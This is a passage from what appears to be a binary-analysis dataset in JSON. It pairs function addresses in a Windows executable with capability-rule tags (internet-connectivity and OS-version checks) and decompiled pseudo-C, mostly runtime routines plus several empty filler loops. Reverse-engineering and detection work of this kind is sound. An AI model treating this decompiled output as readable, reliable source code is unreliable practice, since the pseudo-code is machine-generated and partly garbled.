        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00403661(uint8_t *arg_8h, uint8_t *arg_ch, uint32_t arg_10h, uint arg_14h)\n\n{\n    uint8_t uVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_8h == NULL) {\n        puVar2 = fcn.00403a35();\n        *puVar2 = 0x16;\n        fcn.004037ce();\n        iVar3 = 0x7fffffff;\n    }\n    else if (arg_ch == NULL) {\n        puVar2 = fcn.00403a35();\n        *puVar2 = 0x16;\n        fcn.004037ce();\n        iVar3 = 0x7fffffff;\n    }\n    else if (arg_10h < 0x80000000) {\n        if (arg_10h == 0) {\n            iVar3 = 0;\n        }\n        else {\n            fcn.004058a8(arg_14h);\n            do {\n                uVar1 = *arg_8h;\n                arg_8h = arg_8h + 1;\n                uVar4 = *(uVar1 + *(var_10h + 0x94));\n                uVar1 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                iVar3 = uVar4 - *(uVar1 + *(var_10h + 0x94));\n                if ((iVar3 != 0) || (uVar4 == 0)) break;\n                arg_10h = arg_10h - 1;\n            } while (arg_10h != 0);\n            if (var_8h != '\\0') {\n                *(var_14h + 0x350) = *(var_14h + 0x350) & 0xfffffffd;\n            }\n        }\n    }\n    else {\n        puVar2 = fcn.00403a35();\n        *puVar2 = 0x16;\n        fcn.004037ce();\n        iVar3 = 0x7fffffff;\n    }\n    return iVar3;\n}\n",
        "token_count": 518
    },
    "00403689": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00403689(uint32_t *param_1)\n\n{\n    uint32_t *arg_14h;\n    char *pcVar1;\n    bool bVar2;\n    bool bVar3;\n    char cVar4;\n    uchar uVar5;\n    uint *puVar6;\n    uint32_t uVar7;\n    int32_t arg_ch;\n    int32_t arg_10h;\n    uint arg_8h;\n    uint arg_ch_00;\n    int32_t iStack12;\n    uint uStack8;\n    \n    cVar4 = *(param_1 + 0x31);\n    if (cVar4 != 'F') {\n        if (cVar4 == 'N') {\n            if ((*param_1 & 8) != 0) {\n                return 1;\n            }\n            param_1[7] = 8;\n        }\n        else if (param_1[0xb] == 0) {\n            if (cVar4 < 'k') {\n                if (cVar4 == 'j') {\n                    param_1[0xb] = 5;\n                    return 1;\n                }\n                if (cVar4 == 'I') {\n                    pcVar1 = param_1[4];\n                    cVar4 = *pcVar1;\n                    if ((cVar4 == '3') && (pcVar1[1] == '2')) {\n                        param_1[0xb] = 10;\n                        param_1[4] = pcVar1 + 2;\n                        return 1;\n                    }\n                    if ((cVar4 == '6') && (pcVar1[1] == '4')) {\n                        param_1[0xb] = 0xb;\n                        param_1[4] = pcVar1 + 2;\n                        return 1;\n                    }\n                    if (((((cVar4 != 'd') && (cVar4 != 'i')) && (cVar4 != 'o')) && ((cVar4 != 'u' && (cVar4 != 'x'))))\n                       && (cVar4 != 'X')) {\n                        return 1;\n                    }\n                    param_1[0xb] = 9;\n                    return 1;\n                }\n                if (cVar4 == 'L') {\n                    param_1[0xb] = 8;\n                    return 1;\n                }\n                if (cVar4 == 'T') {\n                    param_1[0xb] = 0xd;\n                    return 1;\n                }\n                if (cVar4 != 'h') {\n                    return 1;\n                }\n                if (*param_1[4] == 'h') {\n                    param_1[4] = param_1[4] + 1;\n                    uVar7 = 1;\n                }\n                else {\n                    uVar7 = 2;\n                }\n            }\n            else {\n                if (cVar4 != 'l') {\n                    if (cVar4 == 't') {\n                        param_1[0xb] = 7;\n                        return 1;\n                    }\n                    if (cVar4 == 'w') {\n                        param_1[0xb] = 0xc;\n                        return 1;\n                    }\n                    if (cVar4 == 'z') {\n                        param_1[0xb] = 6;\n                        return 1;\n                    }\n                    return 1;\n                }\n                if (*param_1[4] == 'l') {\n                    param_1[4] = param_1[4] + 1;\n                    uVar7 = 4;\n                }\n                else {\n                    uVar7 = 3;\n                }\n            }\n            param_1[0xb] = uVar7;\n            return 1;\n        }\n        puVar6 = fcn.00403a35();\n        *puVar6 = 0x16;\n        fcn.004037ce();\n        return 0;\n    }\n    if ((*param_1 & 8) != 0) {\n        return 1;\n    }\n    param_1[7] = 7;\n    cVar4 = *(param_1 + 0x31);\n    uStack8 = param_1;\n    if (cVar4 < 'e') {\n        if (cVar4 == 'd') {\ncode_r0x004a0388:\n            param_1[8] = param_1[8] | 0x10;\ncode_r0x004a038c:\n            arg_ch_00 = 0;\n            arg_8h = 10;\ncode_r0x004a038f:\n            cVar4 = fcn.00402e96(arg_8h, arg_ch_00);\n        }\n        else if (cVar4 < 'Y') {\n            if (cVar4 == 'X') {\n                arg_ch_00 = 1;\ncode_r0x004a0334:\n                arg_8h = 0x10;\n                goto code_r0x004a038f;\n            }\n            if (cVar4 != 'A') {\n                if (cVar4 == 'C') goto code_r0x004a0348;\n                if (cVar4 < 'E') {\n                    return 0;\n                }\n                if ('G' < cVar4) {\n                    if (cVar4 != 'S') {\n                        return 0;\n                    }\n                    goto code_r0x004a031c;\n                }\n            }\ncode_r0x004a0398:\n            cVar4 = fcn.00404a89();\n        }\n        else if (cVar4 == 'Z') {\n            cVar4 = fcn.00404c7d();\n        }\n        else {\n            if (cVar4 == 'a') goto code_r0x004a0398;\n            if (cVar4 != 'c') {\n                return 0;\n            }\ncode_r0x004a0348:\n            cVar4 = fcn.00404c73(0);\n        }\n    }\n    else if (cVar4 < 'q') {\n        if (cVar4 == 'p') {\n            cVar4 = fcn.00402351();\n        }\n        else {\n            if (cVar4 < 'h') goto code_r0x004a0398;\n            if (cVar4 == 'i') goto code_r0x004a0388;\n            if (cVar4 == 'n') {\n                cVar4 = fcn.004023c4();\n            }\n            else {\n                if (cVar4 != 'o') {\n                    return 0;\n                }\n                cVar4 = fcn.0040468d();\n            }\n        }\n    }\n    else {\n        if (cVar4 != 's') {\n            if (cVar4 != 'u') {\n                if (cVar4 != 'x') {\n                    return 0;\n                }\n                arg_ch_00 = 0;\n                goto code_r0x004a0334;\n            }\n            goto code_r0x004a038c;\n        }\ncode_r0x004a031c:\n        cVar4 = fcn.00403fcb();\n    }\n    if (cVar4 == '\\0') {\n        return 0;\n    }\n    if (*(param_1 + 0xc) != '\\0') {\n        return 1;\n    }\n    arg_ch = 0;\n    uStack8 = (uStack8 >> 0x10 & 0xff00) << 0x10;\n    uVar7 = param_1[8];\n    iStack12 = 0;\n    if ((uVar7 >> 4 & 1) != 0) {\n        uStack8._1_3_ = uStack8 >> 8;\n        if ((uVar7 >> 6 & 1) == 0) {\n            if ((uVar7 & 1) == 0) {\n                if ((uVar7 >> 1 & 1) != 0) {\n                    uStack8 = CONCAT31(uStack8._1_3_, 0x20);\n                    arg_ch = 1;\n                    iStack12 = 1;\n                }\n                goto code_r0x004a041e;\n            }\n            uStack8 = CONCAT31(uStack8._1_3_, 0x2b);\n        }\n        else {\n            uStack8 = CONCAT31(uStack8._1_3_, 0x2d);\n        }\n        iStack12 = 1;\n        arg_ch = 1;\n    }\ncode_r0x004a041e:\n    cVar4 = *(param_1 + 0x31);\n    if (((cVar4 == 'x') || (cVar4 == 'X')) && ((uVar7 >> 5 & 1) != 0)) {\n        bVar2 = true;\n    }\n    else {\n        bVar2 = false;\n    }\n    if ((cVar4 == 'a') || (cVar4 == 'A')) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((bVar2) || (bVar3)) {\n        *(&uStack8 + arg_ch) = 0x30;\n        if ((cVar4 == 'X') || (cVar4 == 'A')) {\n            uVar5 = 0x58;\n        }\n        else {\n            uVar5 = 0x78;\n        }\n        *(&uStack8 + arg_ch + 1) = uVar5;\n        arg_ch = arg_ch + 2;\n        iStack12 = arg_ch;\n    }\n    arg_14h = param_1 + 6;\n    arg_10h = (param_1[9] - param_1[0xe]) - arg_ch;\n    if ((*(param_1 + 8) & 0xc) == 0) {\n        fcn.00403d6e(param_1 + 0x112, 0x20, arg_10h, arg_14h);\n        arg_ch = iStack12;\n    }\n    fcn.00405ef2(&uStack8, arg_ch, arg_14h, param_1 + 3);\n    if (((param_1[8] >> 3 & 1) != 0) && ((param_1[8] >> 2 & 1) == 0)) {\n        fcn.00403d6e(param_1 + 0x112, 0x30, arg_10h, arg_14h);\n    }\n    fcn.004012f3(0);\n    if ((-1 < *arg_14h) && ((param_1[8] >> 2 & 1) != 0)) {\n        fcn.00403d6e(param_1 + 0x112, 0x20, arg_10h, arg_14h);\n    }\n    return 1;\n}\n",
        "token_count": 2371
    },
    "004036f7": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.004036f7(uint32_t *param_1)\n\n{\n    uint32_t *arg_8h;\n    int16_t iVar1;\n    uint16_t *puVar2;\n    bool bVar3;\n    bool bVar4;\n    char cVar5;\n    uint *puVar6;\n    uint32_t uVar7;\n    int32_t arg_ch;\n    int32_t arg_10h;\n    uint unaff_ESI;\n    ushort uVar8;\n    uint16_t uVar9;\n    uint arg_8h_00;\n    uint arg_ch_00;\n    int32_t iStack20;\n    uint uStack16;\n    ushort uStack12;\n    uint16_t *puStack8;\n    \n    uVar9 = *(param_1 + 0x32);\n    puStack8 = uVar9;\n    if (puStack8 != 0x46) {\n        if (puStack8 == 0x4e) {\n            puStack8 = *param_1 & 8;\n            if (puStack8 != NULL) goto code_r0x004a009e;\n            param_1[7] = 8;\ncode_r0x0049ff69:\n            puStack8 = 0x49ff6e;\n            puVar6 = fcn.00403a35();\n            *puVar6 = 0x16;\n            puStack8 = 0x49ff79;\n            uVar7 = fcn.004037ce();\n            return uVar7 & 0xffffff00;\n        }\n        if (param_1[0xb] != 0) goto code_r0x0049ff69;\n        if (uVar9 < 0x6b) {\n            if (uVar9 == 0x6a) {\n                param_1[0xb] = 5;\n                goto code_r0x004a009e;\n            }\n            if (puStack8 == 0x49) {\n                puVar2 = param_1[4];\n                puStack8 = *puVar2;\n                if ((puStack8 == 0x33) && (puVar2[1] == 0x32)) {\n                    puStack8 = puVar2 + 2;\n                    param_1[0xb] = 10;\n                    param_1[4] = puStack8;\n                }\n                else if ((puStack8 == 0x36) && (puVar2[1] == 0x34)) {\n                    puStack8 = puVar2 + 2;\n                    param_1[0xb] = 0xb;\n                    param_1[4] = puStack8;\n                }\n                else if (((((puStack8 == 0x64) || (puStack8 == 0x69)) || (puStack8 == 0x6f)) ||\n                         ((puStack8 == 0x75 || (puStack8 == 0x78)))) || (puStack8 == 0x58)) {\n                    param_1[0xb] = 9;\n                }\n                goto code_r0x004a009e;\n            }\n            if (puStack8 == 0x4c) {\n                param_1[0xb] = 8;\n                goto code_r0x004a009e;\n            }\n            if (puStack8 == 0x54) {\n                param_1[0xb] = 0xd;\n                goto code_r0x004a009e;\n            }\n            if (uVar9 != 0x68) goto code_r0x004a009e;\n            if (*param_1[4] == 0x68) {\n                param_1[4] = param_1[4] + 1;\n                puStack8 = 0x1;\n            }\n            else {\n                puStack8 = 0x2;\n            }\n        }\n        else {\n            if (uVar9 != 0x6c) {\n                if (puStack8 == 0x74) {\n                    param_1[0xb] = 7;\n                }\n                else if (puStack8 == 0x77) {\n                    param_1[0xb] = 0xc;\n                }\n                else if (puStack8 == 0x7a) {\n                    param_1[0xb] = 6;\n                }\n                goto code_r0x004a009e;\n            }\n            if (*param_1[4] == 0x6c) {\n                param_1[4] = param_1[4] + 1;\n                puStack8 = 0x4;\n            }\n            else {\n                puStack8 = 0x3;\n            }\n        }\n        param_1[0xb] = puStack8;\ncode_r0x004a009e:\n        return CONCAT31(puStack8 >> 8, 1);\n    }\n    puStack8 = *param_1 & 8;\n    if (puStack8 != NULL) goto code_r0x004a009e;\n    param_1[7] = 7;\n    puStack8 = *0x571ca8 ^ &stack0xfffffffc;\n    uVar9 = *(param_1 + 0x32);\n    if (uVar9 < 0x65) {\n        if (uVar9 == 100) {\ncode_r0x004a2012:\n            param_1[8] = param_1[8] | 0x10;\ncode_r0x004a2016:\n            arg_ch_00 = 0;\n            arg_8h_00 = 10;\ncode_r0x004a2019:\n            cVar5 = fcn.004043ae(arg_8h_00, arg_ch_00);\n        }\n        else if (uVar9 < 0x59) {\n            if (uVar9 == 0x58) {\n                arg_ch_00 = 1;\ncode_r0x004a1fbe:\n                arg_8h_00 = 0x10;\n                goto code_r0x004a2019;\n            }\n            if (uVar9 != 0x41) {\n                if (uVar9 == 0x43) goto code_r0x004a1fd2;\n                if (uVar9 < 0x45) goto code_r0x004a21b1;\n                if (0x47 < uVar9) {\n                    if (uVar9 != 0x53) goto code_r0x004a21b1;\n                    goto code_r0x004a1fa6;\n                }\n            }\ncode_r0x004a2022:\n            cVar5 = fcn.004040ac();\n        }\n        else if (uVar9 == 0x5a) {\n            cVar5 = fcn.00404ab6();\n        }\n        else {\n            if (uVar9 == 0x61) goto code_r0x004a2022;\n            if (uVar9 != 99) goto code_r0x004a21b1;\ncode_r0x004a1fd2:\n            cVar5 = fcn.00402720(0);\n        }\n    }\n    else if (uVar9 < 0x71) {\n        if (uVar9 == 0x70) {\n            cVar5 = fcn.00401429();\n        }\n        else {\n            if (uVar9 < 0x68) goto code_r0x004a2022;\n            if (uVar9 == 0x69) goto code_r0x004a2012;\n            if (uVar9 == 0x6e) {\n                cVar5 = fcn.004024d2();\n            }\n            else {\n                if (uVar9 != 0x6f) goto code_r0x004a21b1;\n                cVar5 = fcn.00402662();\n            }\n        }\n    }\n    else {\n        if (uVar9 != 0x73) {\n            if (uVar9 != 0x75) {\n                if (uVar9 != 0x78) goto code_r0x004a21b1;\n                arg_ch_00 = 0;\n                goto code_r0x004a1fbe;\n            }\n            goto code_r0x004a2016;\n        }\ncode_r0x004a1fa6:\n        cVar5 = fcn.00403c83();\n    }\n    if (((cVar5 == '\\0') || (cVar5 = fcn.0040263a(),  cVar5 != '\\0')) || (*(param_1 + 0xc) != '\\0'))\n    goto code_r0x004a21b1;\n    arg_ch = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    uVar7 = param_1[8];\n    iStack20 = 0;\n    if ((uVar7 >> 4 & 1) != 0) {\n        if ((uVar7 >> 6 & 1) == 0) {\n            if ((uVar7 & 1) == 0) {\n                if ((uVar7 >> 1 & 1) != 0) {\n                    uStack16 = 0x20;\n                    arg_ch = 1;\n                    iStack20 = 1;\n                }\n                goto code_r0x004a20bc;\n            }\n            uVar9 = 0x2b;\n        }\n        else {\n            uVar9 = 0x2d;\n        }\n        uStack16 = uVar9;\n        iStack20 = 1;\n        arg_ch = 1;\n    }\ncode_r0x004a20bc:\n    iVar1 = *(param_1 + 0x32);\n    if (((iVar1 == 0x78) || (iVar1 == 0x58)) && ((uVar7 >> 5 & 1) != 0)) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((iVar1 == 0x61) || (iVar1 == 0x41)) {\n        bVar4 = true;\n    }\n    else {\n        bVar4 = false;\n    }\n    if ((bVar3) || (bVar4)) {\n        *(&stack0xfffffff0 + arg_ch * 2) = 0x30;\n        if ((iVar1 == 0x58) || (uVar8 = 0x78,  iVar1 == 0x41)) {\n            uVar8 = 0x58;\n        }\n        *(&stack0xfffffff2 + arg_ch * 2) = uVar8;\n        arg_ch = arg_ch + 2;\n        iStack20 = arg_ch;\n    }\n    arg_8h = param_1 + 0x112;\n    arg_10h = (param_1[9] - param_1[0xe]) - arg_ch;\n    if ((*(param_1 + 8) & 0xc) == 0) {\n        fcn.00403fbc(arg_8h, 0x20, arg_10h, param_1 + 6);\n        arg_ch = iStack20;\n    }\n    fcn.00402978(&stack0xfffffff0, arg_ch, param_1 + 6);\n    if (((param_1[8] >> 3 & 1) != 0) && ((param_1[8] >> 2 & 1) == 0)) {\n        fcn.00403fbc(arg_8h, 0x30, arg_10h, param_1 + 6);\n    }\n    fcn.00405df8(0);\n    if ((-1 < param_1[6]) && ((param_1[8] >> 2 & 1) != 0)) {\n        fcn.00403fbc(arg_8h, 0x20, arg_10h, param_1 + 6);\n    }\ncode_r0x004a21b1:\n    uVar7 = fcn.004030bc(unaff_ESI);\n    return uVar7;\n}\n",
        "token_count": 2650
    },
    "00403715": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n\nfloat10 __cdecl fcn.00403715(uint arg_8h)\n\n{\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    for (var_10h = 0x51; 0 < var_10h; var_10h = var_10h + -1) {\n    }\n    for (var_14h = 0xf; 0 < var_14h; var_14h = var_14h + -1) {\n    }\n    for (var_18h = 0x31; 0 < var_18h; var_18h = var_18h + -1) {\n    }\n    for (var_1ch = 0x61; 0 < var_1ch; var_1ch = var_1ch + -1) {\n    }\n    fcn.00403b02(&stack0x0000001c);\n    return *0x4ec364;\n}\n",
        "token_count": 271
    },
    "0040371f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040371f(uint arg_8h, uint noname_1, int32_t arg_10h)\n\n{\n    if (arg_10h != 0) {\n        fcn.00406712(arg_8h);\n        return;\n    }\n    fcn.0040528b(arg_8h);\n    return;\n}\n",
        "token_count": 78
    },
    "00403756": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00403756(uint16_t *arg_8h, uint16_t *arg_ch)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    if (*0x57504c != 0) {\n        iVar2 = fcn.00405402(arg_8h, arg_ch, 0);\n        return iVar2;\n    }\n    if ((arg_8h != NULL) && (arg_ch != NULL)) {\n        do {\n            uVar3 = *arg_8h;\n            if (uVar3 - 0x41 < 0x1a) {\n                uVar3 = uVar3 + 0x20;\n            }\n            uVar4 = *arg_ch;\n            arg_8h = arg_8h + 1;\n            if (uVar4 - 0x41 < 0x1a) {\n                uVar4 = uVar4 + 0x20;\n            }\n            arg_ch = arg_ch + 1;\n        } while ((uVar3 - uVar4 == 0) && (uVar3 != 0));\n        return uVar3 - uVar4;\n    }\n    puVar1 = fcn.00403a35();\n    *puVar1 = 0x16;\n    fcn.004037ce();\n    return 0x7fffffff;\n}\n",
        "token_count": 313
    },
    "0040376f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.0040376f(uint arg_8h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t iStack64;\n    int32_t iStack60;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack28 = 0x450c80;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    for (iStack60 = 0x11; 0 < iStack60; iStack60 = iStack60 + -1) {\n    }\n    for (iStack64 = 7; 0 < iStack64; iStack64 = iStack64 + -1) {\n    }\n    uStack24 = 1;\n    fcn.00401e79(\"qfdsxsayy\");\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return arg_8h;\n}\n",
        "token_count": 255
    },
    "004037a6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nfloat10 __cdecl fcn.004037a6(uint arg_8h)\n\n{\n    int32_t iStack72;\n    \n    for (iStack72 = 0x14; 0 < iStack72; iStack72 = iStack72 + -1) {\n    }\n    fcn.00403b02(&arg_8h, &stack0x0000001c);\n    fcn.00403b02();\n    return *0x5468c4;\n}\n",
        "token_count": 104
    },
    "004037ec": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004037ec(int32_t arg_8h)\n\n{\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = 0x5d;\n    while (0 < var_ch) {\n        arg_8h = var_ch + -1;\n        var_ch = arg_8h;\n    }\n    var_10h = 0x30;\n    while (0 < var_10h) {\n        arg_8h = var_10h + -1;\n        var_10h = arg_8h;\n    }\n    var_14h = 5;\n    while (0 < var_14h) {\n        arg_8h = var_14h + -1;\n        var_14h = arg_8h;\n    }\n    return arg_8h;\n}\n",
        "token_count": 207
    },
    "00403805": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403805(uint32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint var_4h;\n    \n    if ((-1 < arg_8h) && (arg_8h < *0x575488)) {\n        iVar3 = (arg_8h & 0x3f) * 0x38;\n        if (*(iVar3 + 0x18 + *((arg_8h >> 6) * 4 + 0x575220)) == -1) {\n            iVar1 = fcn.0040198d();\n            if (iVar1 == 1) {\n                if (arg_8h == 0) {\n                    uVar4 = 0xfffffff6;\n                }\n                else if (arg_8h == 1) {\n                    uVar4 = 0xfffffff5;\n                }\n                else {\n                    if (arg_8h != 2) goto code_r0x004cc010;\n                    uVar4 = 0xfffffff4;\n                }\n                (*_sym.imp.KERNEL32.dll_SetStdHandle)(uVar4, arg_ch);\n            }\ncode_r0x004cc010:\n            *(iVar3 + 0x18 + *((arg_8h >> 6) * 4 + 0x575220)) = arg_ch;\n            return 0;\n        }\n    }\n    puVar2 = fcn.00403a35();\n    *puVar2 = 9;\n    puVar2 = fcn.0040185c();\n    *puVar2 = 0;\n    return 0xffffffff;\n}\n",
        "token_count": 372
    },
    "00403891": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00403891(int32_t arg_8h)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    if (((arg_8h == 0) || (uVar2 = fcn.00403eb8(arg_8h, 0x55),  0x54 < uVar2)) ||\n       (iVar3 = fcn.0040409d(uVar2 * 2 + 2),  iVar3 == 0)) {\n        iVar3 = 0;\n    }\n    else {\n        iVar4 = fcn.00405b64(iVar3, uVar2 + 1, arg_8h, uVar2 + 1);\n        if (iVar4 != 0) {\n            fcn.0040366b(0, 0, 0, 0, 0);\n            pcVar1 = swi(3);\n            iVar3 = (*pcVar1)();\n            return iVar3;\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 239
    },
    "004038a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004038a0(int32_t *arg_8h, int32_t arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    char cVar1;\n    uint *puVar2;\n    \n    if (*arg_8h == 0) {\n        *arg_8h = arg_ch;\n        *(arg_8h + 1) = arg_10h;\n        arg_8h[3] = arg_14h;\n    }\n    else {\n        cVar1 = fcn.0040209f(arg_8h, arg_ch, arg_10h, arg_14h);\n        if (cVar1 == '\\0') {\n            puVar2 = fcn.00403a35();\n            *puVar2 = 0x16;\n            fcn.004037ce();\n            return 0;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 200
    },
    "004038be": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.004038be(uint *arg_8h)\n\n{\n    uint uVar1;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    if (**0x574458 == '\\0') {\n        fcn.004017df(1);\n        return arg_8h;\n    }\n    fcn.00405498(&var_10h);\n    fcn.0040330f(&var_8h, 0x7b);\n    if (**0x574458 != '@') {\n        uVar1 = fcn.0040295a(&var_10h, 0, 0);\n        fcn.00402eeb(uVar1);\n        fcn.00403d55(0x3a);\n        uVar1 = fcn.00403e8b(&var_10h);\n        fcn.00402eeb(uVar1);\n    }\n    fcn.00403d55(0x7d);\n    if (**0x574458 == '@') {\n        *0x574458 = *0x574458 + 1;\n        *arg_8h = var_8h;\n        arg_8h[1] = var_4h;\n    }\n    else {\n        arg_8h[1] = 0;\n        *(arg_8h + 1) = 2;\n        *arg_8h = 0;\n    }\n    return arg_8h;\n}\n",
        "token_count": 323
    },
    "00403945": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00403945(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t arg_ch;\n    int32_t iVar2;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    if ((*(param_1 + 0x3c) == '\\0') && (iVar2 = 0,  0 < *(param_1 + 0x38))) {\n        arg_ch = *(param_1 + 0x34);\n        do {\n            var_4h = var_4h & 0xffff0000;\n            iVar1 = fcn.0040105a(&var_4h, arg_ch, *(**(param_1 + 8) + 4), *(param_1 + 8));\n            if (iVar1 < 1) {\n                *(param_1 + 0x18) = 0xffffffff;\n                return 1;\n            }\n            fcn.004016ae(var_4h, param_1 + 0x18);\n            arg_ch = arg_ch + iVar1;\n            iVar2 = iVar2 + 1;\n        } while (iVar2 != *(param_1 + 0x38));\n    }\n    else {\n        fcn.00402978(*(param_1 + 0x34), *(param_1 + 0x38), param_1 + 0x18);\n    }\n    return 1;\n}\n",
        "token_count": 317
    },
    "0040395e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
